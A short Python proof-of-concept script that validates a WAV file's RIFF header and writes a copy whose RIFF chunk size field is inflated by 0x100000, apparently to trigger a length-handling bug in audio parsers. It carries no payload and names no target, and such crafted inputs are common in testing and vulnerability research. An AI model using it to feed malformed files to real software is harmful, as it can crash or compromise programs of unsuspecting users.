import struct
import sys
from pathlib import Path

if len(sys.argv) != 2:
    print("Usage: python poc.py <input.wav>")
    sys.exit(1)

src = Path(sys.argv[1])

if not src.exists():
    print(f"File not found: {src}")
    sys.exit(1)

b = bytearray(src.read_bytes())

if len(b) < 12 or b[0:4] != b"RIFF" or b[8:12] != b"WAVE":
    print("Not a valid RIFF/WAVE file")
    sys.exit(1)

original = struct.unpack_from("<I", b, 4)[0]
modified = original + 0x100000

struct.pack_into("<I", b, 4, modified)

output = src.with_name(src.stem + "_riff_poc.wav")
output.write_bytes(b)

print(f"[+] Input:          {src.name}")
print(f"[+] Output:         {output.name}")
print(f"[+] Original RIFF:  {original}")
print(f"[+] Modified RIFF:  {modified}")